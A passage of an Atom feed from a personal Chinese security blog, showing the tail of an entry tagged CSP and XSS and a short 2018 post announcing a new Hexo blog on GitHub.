        &lt;p&gt;首发在信安之路上 &lt;a href=&quot;https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/z_XmhrTUg_
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CSP" scheme="https://hurricane618.me/tags/CSP/"/>
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>新的开始</title>
    <link href="https://hurricane618.me/2018/06/26/new-start/"/>
    <id>https://hurricane618.me/2018/06/26/new-start/</id>
    <published>2018-06-26T03:10:58.000Z</published>
    <updated>2018-07-19T01:05:29.276Z</updated>
    
    <content type="html"><![CDATA[<p>之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。</p><p>一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。</p><img src="/2018/06/26/new-start/67863722_p0.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。&lt;/p&gt;
&lt;p&gt;一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。&lt;/p&gt;
&lt;img src=&quot;/2018/06/26/new-start/
      
    
    </summary>
    
      <category term="杂谈" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="闲聊" scheme="https://hurricane618.me/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
</feed>
